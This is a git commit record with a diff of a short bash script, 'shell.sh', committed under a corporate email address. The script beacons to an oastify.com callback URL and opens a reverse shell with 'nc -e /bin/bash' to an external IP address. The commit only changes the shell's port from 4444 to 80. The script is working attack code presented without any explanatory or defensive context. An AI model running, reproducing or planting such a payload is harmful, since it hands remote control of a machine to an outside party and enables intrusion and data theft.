70bd375aef4a09a6e49d46a528b36104a78fc67b
rmamartindeabiapartner-ux <rma.martindeabia.partner@decathlon.com>
2025-11-12 15:32:32 +0100

    Update shell.sh

--- shell.sh
+++ shell.sh
@@ -1,5 +1,5 @@
 #!/bin/bash 
 
 curl http://84anffv3cvd4nba7y0tdnxo33u9lxbl0.oastify.com/runned
-nc -e /bin/bash 185.181.4.52 4444
+nc -e /bin/bash 185.181.4.52 80
 curl http://84anffv3cvd4nba7y0tdnxo33u9lxbl0.oastify.com/ended
